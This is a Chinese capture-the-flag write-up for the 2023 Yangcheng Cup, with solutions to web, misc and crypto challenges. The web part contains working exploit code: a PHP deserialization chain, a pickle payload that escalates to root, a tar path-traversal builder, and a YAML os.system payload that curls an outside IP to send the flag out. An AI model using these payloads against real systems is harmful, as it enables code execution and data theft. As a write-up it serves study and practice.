# 羊城杯2023


参考：

[2023年“羊城杯”网络安全大赛 WP (qq.com)](https://mp.weixin.qq.com/s/xy7wd_dsuFB_FWdiq_35-Q)

[羊城杯 2023 Writeup - 星盟安全团队 (xmcve.com)](http://blog.xmcve.com/2023/09/03/羊城杯-2023-Writeup/)

## Web

### D0n't pl4y g4m3!!!

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219587.png)

hint.zip 内有 hint.txt，解密

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219588.png)

```bash
/tmp/catcatf1ag.txt
```

[PHP＜=7.4.21 Development Server源码泄露漏洞_这周末在做梦的博客-CSDN博客](https://blog.csdn.net/weixin_46203060/article/details/129350280)

查看源码

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219589.png)

p0p.php

```php
<?php
header("HTTP/1.1 302 found");
header("Location:https://passer-by.com/pacman/");

class Pro{
    private $exp;
    private $rce2;

    public function __get($name)
    {
        return $this->$rce2=$this->exp[$rce2];
    }
    public  function __toString()
    {
            call_user_func('system', "cat /flag");
     }
}

class Yang
{
    public function __call($name, $ary)
    {
        if ($this->key === true || $this->finish1->name) {
            if ($this->finish->finish) {
                call_user_func($this->now[$name], $ary[0]);
            }
        }
    }
    public function ycb()
    {
        $this->now = 0;
        return $this->finish->finish;
    }
    public function __wakeup()
    {
        $this->key = True;
    }
}
class Cheng
{
    private $finish;
    public $name;
    public function __get($value)
    {

        return $this->$value = $this->name[$value];
    }
}
class Bei
{
    public function __destruct()
    {
        if ($this->CTF->ycb()) {
            $this->fine->YCB1($this->rce, $this->rce1);
        }
    }
    public function __wakeup()
    {
        $this->key = false;
    }
}

function prohib($a){
    $filter = "/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i";
    return preg_replace($filter,'',$a);
}

$a = $_POST["CTF"];
if (isset($a)){
  unserialize(prohib($a));
}
?>
```

exp.php

```php
<?php
class Bei
{
    public $CTF;
    public $fine;
    public $rce;
    public $rce1;
    public function __construct($CTF,$fine,$rce,$rce1){
        $this->CTF=$CTF;
        $this->fine=$fine;
        $this->rce=$rce;
        $this->rce1=$rce1;
    }
}
class Yang
{
    public $finish;
    public $now;
    public function __construct()
    {
        $this->finish->finish=true;
        $this->now = ["YCB1"=>"highlight_file"];
    }
}
$y1=new Yang();
$y2=new Yang();
$b=new Bei($y1,$y2,"/tmp/catcatf1ag.txt","");

$ser=serialize($b);
echo urlencode($ser)."\n";
```

魔术方法call接受的参数是方法名加参数组成的array

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219590.png)

### Serpent

/www.zip

```python
from flask import Flask, session
from secret import secret

@app.route('/verification')
def verification():
    try:
        attribute = session.get('Attribute')
        if not isinstance(attribute, dict):
            raise Exception
    except Exception:
        return 'Hacker!!!'
    if attribute.get('name') == 'admin':
        if attribute.get('admin') == 1:
            return secret
        else:
            return "Don't play tricks on me"
    else:
        return "You are a perfect stranger to me"

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)
```

secret_key在明文

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219591.png)

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219592.png)

/src0de

```python
@app.route('/src0de')
def src0de():
    f = open(__file__, 'r')
    rsp = f.read()
    f.close()
    return rsp[rsp.index("@app.route('/src0de')"):]

@app.route('/ppppppppppick1e')
def ppppppppppick1e():
    try:
        username = "admin"
        rsp = make_response("Hello, %s " % username)
        rsp.headers['hint'] = "Source in /src0de"
        pick1e = request.cookies.get('pick1e')
        if pick1e is not None:
            pick1e = base64.b64decode(pick1e)
        else:
            return rsp
        if check(pick1e):
            pick1e = pickle.loads(pick1e)
            return "Go for it!!!"
        else:
            return "No Way!!!"
    except Exception as e:
        error_message = str(e)
        return error_message

    return rsp

class GWHT():
    def __init__(self):
        pass

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)
```

pickle反序列化加python suid提权

exp.py

```python
import base64

# string.ascii_letters[2]+string.ascii_letters[0]+string.ascii_letters[19]+string.whitespace[0]+string.printable[76]+string.ascii_letters[5]+string.ascii_letters[11]+string.ascii_letters[0]+string.ascii_letters[6]
# 相当于cat /flag，引号问题导致直接写入比较麻烦

opcode = b'''c__builtin__
map
p0
0(]Vraise Exception(__import__("os").popen('python3.8 -c "import os,string;os.setuid(0);os.system(string.ascii_letters[2]+string.ascii_letters[0]+string.ascii_letters[19]+string.whitespace[0]+string.printable[76]+string.ascii_letters[5]+string.ascii_letters[11]+string.ascii_letters[0]+string.ascii_letters[6])"').read())
ap1
0c__builtin__
exec
g1
tp2
0g0
g2
\x81p3
0c__builtin__
tuple
(g3
t\x81.'''

result=base64.b64encode(opcode)
print(result)
Y19fYnVpbHRpbl9fCm1hcApwMAowKF1WcmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oIm9zIikucG9wZW4oJ3B5dGhvbjMuOCAtYyAiaW1wb3J0IG9zLHN0cmluZztvcy5zZXR1aWQoMCk7b3Muc3lzdGVtKHN0cmluZy5hc2NpaV9sZXR0ZXJzWzJdK3N0cmluZy5hc2NpaV9sZXR0ZXJzWzBdK3N0cmluZy5hc2NpaV9sZXR0ZXJzWzE5XStzdHJpbmcud2hpdGVzcGFjZVswXStzdHJpbmcucHJpbnRhYmxlWzc2XStzdHJpbmcuYXNjaWlfbGV0dGVyc1s1XStzdHJpbmcuYXNjaWlfbGV0dGVyc1sxMV0rc3RyaW5nLmFzY2lpX2xldHRlcnNbMF0rc3RyaW5nLmFzY2lpX2xldHRlcnNbNl0pIicpLnJlYWQoKSkKYXAxCjBjX19idWlsdGluX18KZXhlYwpnMQp0cDIKMGcwCmcyCoFwMwowY19fYnVpbHRpbl9fCnR1cGxlCihnMwp0gS4=
```

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219593.png)

### ArkNights

非预期

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219594.png)

### ezyaml

```python
import tarfile
from flask import Flask, render_template, request, redirect
from hashlib import md5
import yaml
import os
import re


app = Flask(__name__)

def waf(s):
    flag = True
    blacklist = ['bytes','eval','map','frozenset','popen','tuple','exec','\\','object','listitems','subprocess','object','apply']
    for no in blacklist:
        if no.lower() in str(s).lower():
            flag= False
            print(no)
            break
    return flag
def extractFile(filepath, type):

    extractdir = filepath.split('.')[0]
    if not os.path.exists(extractdir):
        os.makedirs(extractdir)


    if type == 'tar':
        tf = tarfile.TarFile(filepath)
        tf.extractall(extractdir)
        return tf.getnames()

@app.route('/', methods=['GET'])
def main():
        fn = 'uploads/' + md5().hexdigest()
        if not os.path.exists(fn):
            os.makedirs(fn)
        return render_template('index.html')


@app.route('/upload', methods=['GET', 'POST'])
def upload():

    if request.method == 'GET':
        return redirect('/')

    if request.method == 'POST':
        upFile = request.files['file']
        print(upFile)
        if re.search(r"\.\.|/", upFile.filename, re.M|re.I) != None:
            return "<script>alert('Hacker!');window.location.href='/upload'</script>"

        savePath = f"uploads/{upFile.filename}"
        print(savePath)
        upFile.save(savePath)

        if tarfile.is_tarfile(savePath):
            zipDatas = extractFile(savePath, 'tar')
            return render_template('result.html', path=savePath, files=zipDatas)
        else:
            return f"<script>alert('{upFile.filename} upload successfully');history.back(-1);</script>"


@app.route('/src', methods=['GET'])
def src():
    if request.args:
        username = request.args.get('username')
        with open(f'config/{username}.yaml', 'rb') as f:
            Config = yaml.load(f.read())
            return render_template('admin.html', username="admin", message="success")
    else:
        return render_template('index.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

python的yaml反序列化

a.yaml

```python
!!python/object/apply:os.system ['curl http://119.29.207.27:3000?flag=`cat /fllaagg_here`']
```

生成一个穿越目录的压缩包，指向`../../config/a.yaml`

```python
import tarfile

def create_tar_file(filepaths, output_filepath):
    with tarfile.open(output_filepath, 'w') as tf:
        for filepath in filepaths:
            tf.add(filepath)

filepaths = ['../../config/a.yaml']
output_filepath = 'output.tar'
create_tar_file(filepaths, output_filepath)
```

上传压缩包

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219595.png)

包含a.yaml，带出flag到vps

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219596.png)



## MISC

参考：https://mp.weixin.qq.com/s/0MgADDe-N0KdYnHjPCYP5w

### ez_misc

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219597.png)

windows下截图cve，用工具恢复原图 https://github.com/frankthetank-music/Acropalypse-Multi-Tool

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219598.png)

## Crypto

### Easy_3L

NTRU格密码，LCG

参考：

[从一道CTF题初探NTRU格密码](http://www.hackdig.com/02/hack-57841.htm)

[Crypto-LCG（线性同余方程）](https://xie-yuanhao.gitee.io/2022/01/10/Crypto-LCG线性同余/)

exp.sage

```python
from gmpy2 import *
from Crypto.Util.number import *

S1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141
S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888
S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997
S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736

p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351
h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711
c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2])
f, g = -m.LLL()[0]  # f，g为负，转为正
# print(f, g)

a = f*c % p % g
m = a * inverse_mod(f, g) % g
print(m)

m = 10700695166096094995375972320865971168959897437299342068124161538902514000691034236758289037664275323635047529647532200693311709347984126070052011571264606
S3 = m
output = []
output.append(S1)
output.append(S2)
output.append(S3)
output.append(S4)
output.append(S5)

#全部未知，直接求a,b,m
t=[]
for i in range(4):
   t.append(output[i+1]-output[i])
n=[]
for i in range(2):
   n.append(gcd ( ( t[i+1]*t[i-1] - t[i]*t[i] ) , ( t[i]*t[i+2] - t[i+1]*t[i+1] ) ))
MMI = lambda A, n,s=1,t=0,N=0: (n < 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n<1] #逆元计算
#print(m)
for m in n:
   m=abs(m)
   if m==1:
      continue
   a = (t[3] * MMI(t[2],m)) % m
   b = (output[2] - a * output[1]) % m
   plaintext=(MMI(a,m) * (output[0] - b)) % m
   print(long_to_bytes(plaintext))

# b'DASCTF{NTRU_L0G_a6e_S1mpLe}'
```

### XOR贯穿始终

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219599.png)C0ngr4tulati0n5_y0u_fou^d_m3

参考https://zhuanlan.zhihu.com/p/461349946

根据pri.pem得到rsa参数

pri.pem

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219600.png)

rsa解密后部分乱码，根据提示将后半段与key xor

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219601.png)

exp.py

```python
from gmpy2 import invert
from Crypto.Util.number import long_to_bytes

c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818
n = "b9 ad 33 2f b6 b8 7d 59 b5 b2 0b 4a e8 80 ba 41 6d 87 24 11 1f 99 a9 ed 49 8b cb 36 50 91 d8 3d cc 43 fd ff 9b 60 7d f8 a4 43 bc ad c7 99 07 c9 21 e7 6b 38 00 3b 5b 0e ce 66 04 37 80 31 95 eb fa b9 a7 e2 3f c0 75 12 28 fd ee fe 55 91 82 75 23 d7 b7 9a d0 4d 85 e4 db 5c aa 13 f2 8a 7e 01 24 35 7d 06 85 e0 0f 14 cc bb 96 79 97 99 23 c2 53 1f f4 87 f9 ba 25 00 ad e4 89 95 c3 15 d9 13"
d = "97 4e bb 2d a0 bb 0a fb 36 03 97 0c 3e 17 d8 b0 44 af 22 07 0a 37 50 b0 5b 84 9d de ef 1d 4a 98 61 82 ee d3 83 2c c8 ba fc 31 6e ea 36 83 50 42 e9 6c 0a 85 a2 3a bc 63 7e 72 c7 f0 ea 78 7d f0 61 27 fe 9d c3 d2 1b 8d ae 80 18 bd ff c3 45 10 7d 52 71 dd b6 d5 fb c0 1f 8c bf 73 f4 44 10 d6 1e 00 62 08 35 6f 1c 5b 85 51 5e fc 70 8b 34 b6 76 e7 8f 18 d4 d3 b6 8f 57 65 d1 0b 70 1f 03 61"
p = "ea 59 43 4f 56 0d e2 ea f4 f2 1c 22 fb 10 69 1b 79 48 5e 62 90 00 7d c2 82 42 bc 63 73 9f b9 5f a0 3e 5e d8 07 00 0d 49 1f 0c a4 3e 50 a9 1d 43 a6 94 0f 39 0c 91 75 7a 3b a8 22 6c e5 81 12 c9 "
q = "ca d4 c2 9d 01 7e 30 dd ab d6 06 80 50 44 d9 ca 3e 6a 31 84 fb 4e 1f 33 28 45 55 54 98 c3 6b 02 e7 b9 7e 2e b0 9d 85 c9 19 e3 0a 49 3c e9 4e f9 41 22 61 c3 99 8c 73 44 27 1b 6e 6e 1b 3d fe fb"

n = int(n.replace(" ",""),16)
d = int(d.replace(" ",""),16)
p = int(p.replace(" ",""),16)
q = int(q.replace(" ",""),16)
e = 65537

phi = (p - 1) * (q - 1)
d = invert(e,phi)
m = long_to_bytes(pow(c,d,n))

key = 'C0ngr4tulati0n5_y0u_fou^d_m3'
print(m[:12].decode(),end='')
for i in range(12,40):
    print(chr(m[i]^ord(key[i-12])),end='')
```

### MCeorpkpleer

```python
from Crypto.Util.number import *
from secret import flag


def pubkey(list, m, w):
    pubkey_list = []
    for i in range(len(e_bin)):
        pubkey_list.append(w * list[i] % m)
    return pubkey_list


def e_cry(e, pubkey):
    pubkey_list = pubkey
    encode = 0
    for i in range(len(e)):
        encode += pubkey_list[i] * int(e[i]) % m
    return encode


p = getPrime(1024)
q = getPrime(1024)
n = p * q
e = getPrime(64)
m = bytes_to_long(flag)
c = pow(m, e, n)

e_bin = (bin(e))[2:]
list = [pow(3, i) for i in range(len(e_bin))]
m = getPrime(len(bin(sum(list))) - 1)
w = getPrime(64)
pubkey = pubkey(list, m, w)
en_e = e_cry(e_bin, pubkey)

print('p = {}\n'
      'n = {}\n'
      'c = {}\n'
      'pubkey = {}\n'
      'en_e = {}'.format((p >> 435) << 435, n, c, pubkey, en_e))

'''
p = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744
n = 22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771
c = 156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464
pubkey = [18143710780782459577, 54431132342347378731, 163293397027042136193, 489880191081126408579, 1469640573243379225737, 4408921719730137677211, 13226765159190413031633, 39680295477571239094899, 119040886432713717284697, 357122659298141151854091, 1071367977894423455562273, 3214103933683270366686819, 9642311801049811100060457, 28926935403149433300181371, 86780806209448299900544113, 260342418628344899701632339, 781027255885034699104897017, 2343081767655104097314691051, 7029245302965312291944073153, 21087735908895936875832219459, 63263207726687810627496658377, 189789623180063431882489975131, 569368869540190295647469925393, 1708106608620570886942409776179, 601827224419797931380408071500, 1805481673259393794141224214500, 893952418336266652976851386463, 2681857255008799958930554159389, 3523079163584485147344841221130, 1524252287869625983140881149316, 50264262166963219975822190911, 150792786500889659927466572733, 452378359502668979782399718199, 1357135078508006939347199154597, 4071405235524020818041597463791, 3169230503688232995231149877299, 462706308180869526799807117823, 1388118924542608580399421353469, 4164356773627825741198264060407, 3448085117999647764701149667147, 1299270151115113835209806487367, 3897810453345341505629419462101, 2648446157152195057994615872229, 3422845870014670444537026359650, 1223552407160181874717436564876, 3670657221480545624152309694628, 1966986461557807413563286569810, 1378466783231507511243038452393, 4135400349694522533729115357179, 3361215846199738142293703557463, 1038662335715384967987468158315, 3115987007146154903962404474945, 302975818554635252993570910761, 908927455663905758980712732283, 2726782366991717276942138196849, 3657854499533237101379593333510, 1928578295715881845245137486456, 1263242285705730806288591202331, 3789726857117192418865773606993, 2324195368467747797703678306905, 2450093503961328663664213663678, 2827787910442071261545819733997, 3960871129884299055190637944954, 2837628186769067706678271320788]
en_e = 31087054322877663244023458448558
'''
```

pubkey泄露e_bin长度，得到list和w，泄露素数m的信息

![img](https://raw.githubusercontent.com/githubmof/img/main/img/202309101219602.png)

根据上述公式求出e

```python
from Crypto.Util.number import *
from gmpy2 import *

# 已知信息
p0 = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744
n = 22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771
c = 156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464
pubkey = [18143710780782459577, 54431132342347378731, 163293397027042136193, 489880191081126408579, 1469640573243379225737, 4408921719730137677211, 13226765159190413031633, 39680295477571239094899, 119040886432713717284697, 357122659298141151854091, 1071367977894423455562273, 3214103933683270366686819, 9642311801049811100060457, 28926935403149433300181371, 86780806209448299900544113, 260342418628344899701632339, 781027255885034699104897017, 2343081767655104097314691051, 7029245302965312291944073153, 21087735908895936875832219459, 63263207726687810627496658377, 189789623180063431882489975131, 569368869540190295647469925393, 1708106608620570886942409776179, 601827224419797931380408071500, 1805481673259393794141224214500, 893952418336266652976851386463, 2681857255008799958930554159389, 3523079163584485147344841221130, 1524252287869625983140881149316, 50264262166963219975822190911, 150792786500889659927466572733, 452378359502668979782399718199, 1357135078508006939347199154597, 4071405235524020818041597463791, 3169230503688232995231149877299, 462706308180869526799807117823, 1388118924542608580399421353469, 4164356773627825741198264060407, 3448085117999647764701149667147, 1299270151115113835209806487367, 3897810453345341505629419462101, 2648446157152195057994615872229, 3422845870014670444537026359650, 1223552407160181874717436564876, 3670657221480545624152309694628, 1966986461557807413563286569810, 1378466783231507511243038452393, 4135400349694522533729115357179, 3361215846199738142293703557463, 1038662335715384967987468158315, 3115987007146154903962404474945, 302975818554635252993570910761, 908927455663905758980712732283, 2726782366991717276942138196849, 3657854499533237101379593333510, 1928578295715881845245137486456, 1263242285705730806288591202331, 3789726857117192418865773606993, 2324195368467747797703678306905, 2450093503961328663664213663678, 2827787910442071261545819733997, 3960871129884299055190637944954, 2837628186769067706678271320788]
en_e = 31087054322877663244023458448558

#print(len(pubkey))
l_e = 64
list = [pow(3, i) for i in range(l_e)]
m = getPrime(len(bin(sum(list))) - 1)
w = pubkey[0]
m = 4522492601441914729446821257037
w = 18143710780782459577

# 求解e
d = gmpy2.invert(w,m)
e_3 = en_e*d%m
# 1541788614583423040814113753869，十进制转三进制
e_bin_inv = '1100101000010000100000010111001011011111010101011111111010111011'
# e = int(e_bin_inv[::-1],2)
e = 15960663600754919507

# 高位泄露爆破p
lbits = 435
p = p0
PR.<x> = PolynomialRing(Zmod(n))
f = p0+x
f.monic()
for i in range(1,10):
    for j in range(1,3):
        roots = f.small_roots(X=2**(lbits+1),beta=i/10,esplion=j/100)
        if roots:
            print(roots[0] + p0, i/10, j/100)
            p = p0 + roots[0]
# 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179677630589032444985150800881889090713797496239571291907818169058929859395965304623825442220206712660451198754072531986630133689525911

# 解m
p = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179677630589032444985150800881889090713797496239571291907818169058929859395965304623825442220206712660451198754072531986630133689525911
q = n//p
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

### SigninCrypto

```python
from random import *
from Crypto.Util.number import *
from Crypto.Cipher import DES3
from flag import flag
from key import key
from iv import iv
import os
import hashlib
import secrets

K1= key
hint1 = os.urandom(2) * 8
xor =bytes_to_long(hint1)^bytes_to_long(K1)
print(xor)

def Rand():
    rseed = secrets.randbits(1024)
    List1 = []
    List2 = []
    seed(rseed)
    for i in range(624):
        rand16 = getrandbits(16)
        List1.append(rand16)
    seed(rseed)
    for i in range(312):
        rand64 = getrandbits(64)
        List2.append(rand64)
    with open("task.txt", "w") as file:
        for rand16 in List1:
            file.write(hex(rand16)+ "\n")
        for rand64 in List2:
            file.write(hex((rand64 & 0xffff) | ((rand64 >> 32) & 0xffff) << 16) + "\n")
Rand()

K2 = long_to_bytes(getrandbits(64))
K3 = flag[:8]

KEY = K1 + K2 + K3

IV=iv

IV1=IV[:len(IV)//2]
IV2=IV[len(IV)//2:]

digest1 = hashlib.sha512(IV1).digest().hex()
digest2 = hashlib.sha512(IV2).digest().hex()

digest=digest1+digest2
hint2=(bytes_to_long(IV)<<32)^bytes_to_long(os.urandom(8))
print(hex(bytes_to_long((digest.encode()))))
print(hint2)


mode = DES3.MODE_CBC
des3 = DES3.new(KEY, mode, IV)

pad_len = 8 - len(flag) % 8
padding = bytes([pad_len]) * pad_len
flag += padding

cipher = des3.encrypt(flag)

ciphertext=cipher.hex()
print(ciphertext)

# 334648638865560142973669981316964458403
# 0x62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833
# 22078953819177294945130027344
# a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1
```

先预测随机数，再解flag

```python
# 解随机数
from random import *
from mt19937predictor import MT19937Predictor
from Crypto.Cipher import DES3
from Crypto.Util.number import *
import hashlib
import os

predictor = MT19937Predictor()
allrand = []
with open('task.txt','r') as f:
    allrand = f.read()
    allrand = allrand.split('\n')

for i in range(312):
    rand32_1 = allrand[2*i][2:].zfill(4)+allrand[i+624][-4:].zfill(4)
    rand32_2 = allrand[2*i+1][2:].zfill(4)+allrand[i+624][2:-4].zfill(4)
    predictor.setrandbits(int(rand32_1,16),32)
    predictor.setrandbits(int(rand32_2,16),32)

print("====predictor====")
K2 = predictor.getrandbits(64)
# K2 = 8623025688911679118

bet = b'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=`~{}[]|:;\"\'<>,.?/'
xor = 334648638865560142973669981316964458403
K2 = long_to_bytes(8623025688911679118)
'''
dig = "0x62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833"
#print(long_to_bytes(int(dig,16)))
dig1 = "b497764ec99b9f26d476789fc9481b056e573099a80afbf632dcbd1d19210ac363c2f162516aef2cbe9a43cab83cae79d453fe7f94db99db26f1b69b20593d83"
dig2 = "b497764ec99b9f26d476789fc9481b056e573099a80afbf632dcbd1d19210ac363c2f162516aef2cbe9a43cab83cae79d453fe7f94db99db26f1b69b20593d83"
#print(long_to_bytes(22078953819177294945130027344>>32))
#GWHT
'''
#根据提示出IV
IV = b"GWHTGWHT"

#K1是爆破出来的
for i in range(256):
    for j in range(256):
        for k in bet:
            K1 = long_to_bytes(xor^bytes_to_long(((long_to_bytes(i)+long_to_bytes(j))*8)))
            K3 = b"DASCTF{"+chr(k).encode()
            KEY = K1+K2+K3
            mode = DES3.MODE_CBC
            try:
                des3 = DES3.new(KEY, mode, IV)
            except:
                continue
            print(KEY)#只有以K1开头才可以到达这一步打印出KEY

ciphertext = "a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1"
for k in bet:
    K1 = b'dasctfda'
    K3 = b"DASCTF{"+chr(k).encode()
    KEY = K1+K2+K3
    mode = DES3.MODE_CBC
    try:
        des3 = DES3.new(KEY, mode, IV)
    except:
        continue
    #print(KEY)
    m = des3.decrypt(long_to_bytes(int(ciphertext,16)))
    #print(m)
    if b"CTF" in m or b'ctf' in m:
        print(m)
```
